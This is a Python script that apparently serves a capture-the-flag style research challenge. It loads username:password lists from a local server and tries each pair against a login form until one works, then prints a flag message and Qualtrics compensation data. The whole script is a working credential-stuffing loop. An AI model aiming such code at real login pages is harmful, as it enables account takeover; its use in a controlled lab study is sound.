import requests
import time
import json
from tqdm import tqdm
from bs4 import BeautifulSoup

def load_credentials(url):
    response = requests.get(url)
    credentials = []
    for line in response.text.split('\n'):
        if ':' in line:
            username, password = line.strip().split(':')
            credentials.append((username, password))
    return credentials

def extract_qualtrics_data(html_content):
    """Extract Qualtrics data from the response HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    qualtrics_json = soup.find('pre', id='qualtrics-json')
    if qualtrics_json:
        try:
            data = json.loads(qualtrics_json.text)
            return data
        except json.JSONDecodeError:
            print("Error parsing Qualtrics data JSON")
    return None

def main():
    base_url = 'http://localhost:8087'
    
    # Choose which credential list to use
    list_choice = input("Which credential list to use? (1 or 2): ")
    creds_url = f'{base_url}/credentials{list_choice}.txt'
    
    print("\nLoading credentials...")
    # Store the credentials we get from the server
    stored_credentials = load_credentials(creds_url)
    print(f"Loaded {len(stored_credentials)} credential pairs")
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # Setup progress bar
    pbar = tqdm(stored_credentials, desc="Testing credentials")
    tqdm.write("\n[REMINDER] You can press Ctrl+C at any time to interrupt and switch to the other list.")

    try:
        for username, password in pbar:
            # Try to login with credentials from the stored list
            response = session.post(f'{base_url}/', data={
                'username': username,
                'password': password
            })
            
            # Extract server message
            soup = BeautifulSoup(response.text, 'html.parser')
            alerts = soup.find_all('div', class_='alert')
            for alert in alerts:
                if 'alert-danger' in alert.get('class', []) or 'alert-success' in alert.get('class', []):
                    tqdm.write(f"\nServer: {alert.text.strip()}")
                elif 'alert-warning' in alert.get('class', []):  # Also show delay warnings
                    tqdm.write(f"\nWarning: {alert.text.strip()}")
            
            # Check if login was successful
            if "Login successful" in response.text:
                pbar.close()
                print(f"\nSuccess! Found working credentials! But now that you got the flag they were blocked "
                           f"from the server. ")
                # Extract and display Qualtrics data
                qualtrics_data = extract_qualtrics_data(response.text)
                if qualtrics_data:
                    print("\033[91mCopy the text bellow to Qualtrics to get compensation for this challenge.\033[0m")
                    print(json.dumps(qualtrics_data, indent=2))
                    print("\033[91mCopy the text above to Qualtrics to get compensation for this challenge.\033[0m")
                
                break
            
            
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        print("You can restart the script and select the other credential list if you want to switch")

    
if __name__ == "__main__":
    main()